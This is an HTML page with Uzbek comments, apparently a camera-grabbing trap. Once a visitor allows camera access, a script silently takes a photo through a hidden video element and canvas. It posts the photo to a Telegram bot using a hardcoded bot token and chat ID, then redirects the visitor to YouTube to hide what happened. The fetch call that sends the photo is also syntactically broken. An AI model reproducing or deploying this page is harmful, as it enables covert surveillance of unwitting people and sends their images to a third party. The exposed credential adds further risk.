<!DOCTYPE html>
<html
<head>
  <title>Telegramga Rasm Yuborish</title>
</head>
<body>
  <h2>Rasmingiz yuborilmoqda...</h2>
  <video id="video" autoplay style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const TOKEN = '6050712984:AAGyDYqJAWwHzRNT7OjleskvmfaLF2hCSbs'; // <--- bu yerga o'z tokeningizni yozing
    const CHAT_ID = '5406454987'; // <--- bu yerga user ID yoki kanal ID yozing

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          setTimeout(() => {
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);

            const imageData = canvas.toDataURL('image/jpeg');

            // base64 rasmni blob formatga o‘tkazamiz
            fetch(imageData)
              .then(res => res.blob())
              .then(blob => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'photo.jpg');

                // Bevosita Telegram API'ga yuborish (xavfsiz emas!)
                fetch(https://api.telegram.org/bot${TOKEN}/sendPhoto, {
                  method: 'POST',
                  body: formData
                })
                .then(() => {
                  // YouTube sahifasiga o‘tish
                  window.location.href = 'https://youtube.com';
                })
                .catch(error => {
                  console.error("Telegramga yuborilmadi:", error);
                  alert("Telegramga yuborilmadi!");
                });
              });
          }, 1000); // 1 soniyadan so'ng rasm olish
        };
      })
      .catch(err => {
        alert("Kamera ishlamayapti.");
        console.error(err);
      });
  </script>
</body>
</html>
